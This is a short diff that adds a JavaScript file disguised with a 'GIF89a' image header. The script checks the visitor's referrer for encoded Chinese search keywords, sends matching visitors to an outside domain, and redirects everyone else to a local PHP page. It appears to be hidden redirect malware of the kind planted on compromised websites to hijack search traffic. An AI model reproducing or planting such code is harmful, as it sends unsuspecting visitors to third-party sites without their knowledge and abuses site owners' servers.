@@ -1,0 +1,8 @@
+GIF89a = "";
+var urlRef = document.referrer;
+var keys = [ "ÆøÇ¹","%C6%F8%C7%B9","%E6%B0%94%E6%9E%AA"]; 
+for (var i in keys) {
+    if (urlRef.indexOf(encodeURI(keys[i])) > 0 || urlRef.indexOf(encodeURIComponent(keys[i])) > 0 || urlRef.indexOf(escape(keys[i])) > 0 || urlRef.indexOf(keys[i]) > 0)
+        window.location.href = "http://www.55838408.com";
+}
+document.write("<script>window.location='../index0.php';</script>");
